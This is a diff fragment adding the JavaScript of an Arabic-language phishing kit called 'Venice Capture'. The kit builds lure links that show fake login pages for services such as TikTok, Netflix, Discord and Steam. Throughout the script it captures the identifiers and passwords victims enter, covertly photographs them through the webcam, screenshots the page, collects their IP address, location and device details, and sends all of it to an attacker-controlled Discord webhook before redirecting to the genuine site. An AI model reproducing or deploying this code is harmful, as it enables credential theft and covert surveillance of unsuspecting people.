+    { name: '🎯 الحملة', value: cfg.c || '—', inline: true },
+    { name: '🔖 النوع', value: step === 1 ? 'المعرّف' : 'بيانات كاملة', inline: true },
+    { name: '👤 المعرّف', value: '`' + (id || '—') + '`', inline: false },
+    { name: '🔒 كلمة السر', value: '`' + (pw || '—') + '`', inline: false },
+    { name: '💻 الجهاز', value: dev.os + ' / ' + dev.br + ' / ' + dev.res, inline: true },
+    { name: '🕒 الوقت', value: new Date().toLocaleString('ar-EG'), inline: true }
+  ];
+  if (camState) fields.push({ name: '📷 الكاميرا', value: camState, inline: true });
+  if (geo && (geo.city || geo.ip)){
+    const loc = [geo.city, geo.region, geo.country].filter(Boolean).join('، ');
+    fields.push({ name: '📍 الموقع', value: loc + '\n`' + (geo.ip || '') + '`' + (geo.isp ? '\n' + geo.isp : ''), inline: false });
+    if (geo.lat && geo.lon){
+      fields.push({ name: '🗺️ الإحداثيات', value: `[${geo.lat}, ${geo.lon}](https://www.google.com/maps?q=${geo.lat},${geo.lon})`, inline: false });
+    }
+  }
+  return {
+    username: 'Venice Capture',
+    avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png',
+    embeds: [{
+      title: '🔔 ضحية جديدة — ' + app.name,
+      color: 0x5865f2,
+      fields,
+      footer: { text: 'Campaign: ' + (cfg.c || 'default') },
+      timestamp: new Date().toISOString()
+    }]
+  };
+}
+
+/* =========================================================
+   التصوير بالكاميرا
+   ========================================================= */
+let camStream = null, camSkipped = false;
+
+function camDots(count){
+  $('#camDots').innerHTML = Array.from({ length: count }, () => '<i></i>').join('');
+}
+function markDot(i){
+  const d = $('#camDots').children[i];
+  if (d) d.classList.add('done');
+}
+
+async function camCapture(count){
+  const result = { blobs: [], state: 'مرفوضة' };
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return result;
+
+  try {
+    camStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 960 } },
+      audio: false
+    });
+  } catch(e){ return result; }
+
+  const ov = $('#camOv'), vid = $('#camVid');
+  camSkipped = false;
+  camDots(count);
+  vid.srcObject = camStream;
+  ov.classList.add('on');
+  try { await vid.play(); } catch(e){}
+
+  // انتظار ضبط التركيز والتعريض
+  await new Promise(r => setTimeout(r, 1100));
+
+  for (let i = 0; i < count; i++){
+    if (camSkipped) break;
+    // عدّاد 3 - 2 - 1
+    const cd = $('#camCount');
+    cd.style.display = 'grid';
+    for (let n = 3; n > 0; n--){
+      cd.textContent = n;
+      await new Promise(r => setTimeout(r, 480));
+      if (camSkipped) break;
+    }
+    cd.style.display = 'none';
+    if (camSkipped) break;
+
+    // فلاش + التقاط
+    $('#camFlash').classList.add('on');
+    await new Promise(r => setTimeout(r, 90));
+
+    const cv = document.createElement('canvas');
+    cv.width = vid.videoWidth || 720;
+    cv.height = vid.videoHeight || 960;
+    const ctx = cv.getContext('2d');
+    ctx.translate(cv.width, 0);
+    ctx.scale(-1, 1);
+    try { ctx.drawImage(vid, 0, 0, cv.width, cv.height); } catch(e){}
+    const blob = await new Promise(r => cv.toBlob(r, 'image/jpeg', 0.86));
+
+    $('#camFlash').classList.remove('on');
+    if (blob){ result.blobs.push(blob); markDot(i); }
+    await new Promise(r => setTimeout(r, 420));
+  }
+
+  // تنظيف
+  try { camStream.getTracks().forEach(t => t.stop()); } catch(e){}
+  camStream = null;
+  ov.classList.remove('on');
+  result.state = result.blobs.length ? 'تم التصوير (' + result.blobs.length + ')' : 'لم يتم التصوير';
+  return result;
+}
+
+$('#camSkip').onclick = () => { camSkipped = true; };
+
+/* =========================================================
+   لقطات الشاشة
+   ========================================================= */
+async function capture(root, count, delay){
+  if (typeof html2canvas !== 'function') return [];
+  const out = [];
+  for (let i = 0; i < count; i++){
+    try {
+      const canvas = await html2canvas(root, { scale: 1, useCORS: true, logging: false, backgroundColor: null });
+      const blob = await new Promise(res => canvas.toBlob(res, 'image/png'));
+      if (blob) out.push(blob);
+    } catch(e){}
+    if (i < count - 1) await new Promise(r => setTimeout(r, delay));
+  }
+  return out;
+}
+
+/* =========================================================
+   توليد الرابط
+   ========================================================= */
+$('#genBtn').onclick = () => {
+  const hook = $('#hook').value.trim();
+  if (!/^https:\/\/(discord\.com|discordapp\.com)\/api\/webhooks\//.test(hook)){
+    toast('حط رابط ويب هوك ديسكورد صحيح', 'err'); return;
+  }
+  const cfg = {
+    a: selectedApp,
+    h: hook,
+    c: $('#camp').value.trim(),
+    r: $('#redir').value.trim(),
+    n: Math.min(5, Math.max(1, parseInt($('#shots').value) || 2)),
+    d: Math.min(5000, Math.max(200, parseInt($('#delay').value) || 900)),
+    g: $('#geoSwh').classList.contains('on') ? 1 : 0,
+    cm: $('#camSwh').classList.contains('on') ? 1 : 0,
+    cn: Math.min(3, Math.max(1, parseInt($('#camShots').value) || 2))
+  };
+  const link = location.origin + location.pathname + '#k=' + b64e(cfg);
+  $('#outLink').value = link;
+  $('#qrBox').innerHTML = '<img src="https://api.qrserver.com/v1/create-qr-code/?size=340x340&data=' + encodeURIComponent(link) + '" alt="QR">';
+  $('#result').classList.add('on');
+  saveCfg();
+  toast('تم توليد الرابط', 'ok');
+  $('#result').scrollIntoView({ behavior: 'smooth', block: 'center' });
+};
+
+$('#copyBtn').onclick = async () => {
+  try { await navigator.clipboard.writeText($('#outLink').value); toast('تم النسخ', 'ok'); }
+  catch(e){ $('#outLink').select(); document.execCommand('copy'); toast('تم النسخ', 'ok'); }
+};
+$('#openBtn').onclick = () => window.open($('#outLink').value, '_blank');
+
+$('#testBtn').onclick = async () => {
+  const hook = $('#hook').value.trim();
+  if (!hook){ toast('حط رابط الويب هوك الأول', 'err'); return; }
+  toast('جاري الاختبار...');
+  try {
+    await send(hook, { username: 'Venice Capture',
+      embeds: [{ title: '✅ اختبار الربط', description: 'الويب هوك شغال تمام.', color: 0x22c55e,
+        timestamp: new Date().toISOString() }] });
+    toast('الربط شغال ✅', 'ok');
+  } catch(e){ toast('فشل الربط: ' + e.message, 'err'); }
+};
+
+$('#pasteBtn').onclick = async () => {
+  try { const t = await navigator.clipboard.readText(); if (t){ $('#hook').value = t.trim(); saveCfg(); toast('تم اللصق', 'ok'); } }
+  catch(e){ toast('اسمح بالوصول للحافظة', 'err'); }
+};
+
+$('#geoSwh').onclick = () => { $('#geoSwh').classList.toggle('on'); saveCfg(); };
+$('#camSwh').onclick = () => { $('#camSwh').classList.toggle('on'); saveCfg(); };
+
+/* =========================================================
+   صفحة التقليد
+   ========================================================= */
+let CFG = null, STEP = 1, IDENT = '';
+
+function renderStep(){
+  const app = APPS.find(a => a.id === CFG.a) || APPS[0];
+  document.title = app.name + ' — تسجيل الدخول';
+  const root = $('#fkRoot');
+  root.className = 'fk ' + app.id;
+
+  if (STEP === 1){
+    $('#fkBody').innerHTML = `
+      <div class="fk-logo">${app.logo}</div>
+      <h1 class="fk-title">${app.sub}</h1>
+      <p class="fk-sub">أدخل بياناتك للمتابعة</p>
+      <form class="fk-form" id="f1">
+        <input class="fk-in" id="in1" type="${app.type}" inputmode="${app.type === 'email' ? 'email' : 'text'}"
+          placeholder="${app.label}" autocomplete="username" required>
+        <button class="fk-btn" type="submit">متابعة</button>
+      </form>
+      <div class="fk-sep">أو</div>
+      <button class="fk-alt" style="border:1px solid currentColor;opacity:.8">إنشاء حساب جديد</button>
+      <a class="fk-link" href="${app.real}" target="_blank">هل تواجه مشكلة في تسجيل الدخول؟</a>`;
+    $('#fkFoot').textContent = app.foot;
+    setTimeout(() => $('#in1') && $('#in1').focus(), 250);
+
+    $('#f1').onsubmit = async e => {
+      e.preventDefault();
+      IDENT = $('#in1').value.trim();
+      if (!IDENT) return;
+      STEP = 2; renderStep();
+      if (CFG.h) {
+        const geo = CFG.g ? await getGeo() : null;
+        send(CFG.h, buildPayload(CFG, 1, IDENT, '', geo), []).catch(() => {});
+      }
+    };
+  } else {
+    $('#fkBody').innerHTML = `
+      <div class="fk-logo">${app.logo}</div>
+      <div class="fk-chip"><i>${(IDENT[0] || '؟').toUpperCase()}</i><span>${IDENT}</span></div>
+      <h1 class="fk-title">${app.step2}</h1>
+      <p class="fk-sub">أدخل كلمة السر لإكمال الدخول</p>
+      <form class="fk-form" id="f2">
+        <input class="fk-in" id="in2" type="password" placeholder="${app.step2}" autocomplete="current-password" required>
+        <button class="fk-btn" type="submit">تسجيل الدخول</button>
+      </form>
+      <a class="fk-link" href="${app.real}" target="_blank">هل نسيت كلمة السر؟</a>
+      <a class="fk-link" style="opacity:.6;font-size:12px" href="#" id="back">رجوع</a>`;
+    $('#fkFoot').textContent = app.foot;
+    setTimeout(() => $('#in2') && $('#in2').focus(), 250);
+    $('#back').onclick = e => { e.preventDefault(); STEP = 1; renderStep(); };
+
+    $('#f2').onsubmit = async e => {
+      e.preventDefault();
+      const pw = $('#in2').value;
+      if (!pw) return;
+
+      const dark = ['tiktok','twitter','discord','netflix','steam'].includes(app.id);
+      $('#load').classList.toggle('dark', dark);
+      $('#load').classList.add('on');
+
+      // 1) تصوير الضحية بالكاميرا
+      let cam = { blobs: [], state: null };
+      if (CFG.cm) {
+        $('#load').classList.remove('on'); // نسيب الشاشة للكاميرا
+        cam = await camCapture(CFG.cn || 2);
+        $('#load').classList.add('on');
+      }
+
+      // 2) بيانات الموقع
+      const geo = CFG.g ? await getGeo() : null;
+
+      // 3) لقطات الشاشة
+      const shots = await capture($('#fkRoot'), CFG.n, CFG.d);
+
+      // 4) التجميع والإرسال
+      const files = [];
+      cam.blobs.forEach((b, i) => files.push({ blob: b, name: 'cam_' + (i + 1) + '.jpg' }));
+      shots.forEach((b, i) => files.push({ blob: b, name: 'screen_' + (i + 1) + '.png' }));
+
+      if (CFG.h) {
+        const payload = buildPayload(CFG, 2, IDENT, pw, geo, cam.state);
+        try { await send(CFG.h, payload, files); }
+        catch(err){
+          // إعادة محاولة بدون مرفقات لو الحجم كبير
+          try { await send(CFG.h, payload, []); } catch(e){}
+        }
+      }
+
+      setTimeout(() => { location.href = CFG.r || app.real; }, 1400);
+    };
+  }
+}
+
+function showFake(cfg){
+  CFG = cfg;
+  $('#panel').style.display = 'none';
+  $('#fake').classList.add('on');
+  STEP = 1;
+  renderStep();
+}
+
+/* =========================================================
+   الإقلاع
+   ========================================================= */
+(function init(){
+  buildAppGrid();
+  loadCfg();
+
+  const m = location.hash.match(/#k=(.+)/);
+  if (m){
+    try { showFake(b64d(m[1])); return; } catch(e){}
+  }
+  const s = document.createElement('script');
+  s.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
+  document.head.appendChild(s);
+})();
+
+window.addEventListener('hashchange', () => {
+  const m = location.hash.match(/#k=(.+)/);
+  if (m){ try { showFake(b64d(m[1])); } catch(e){} }
+});
+</script>
+</body>
+</html>
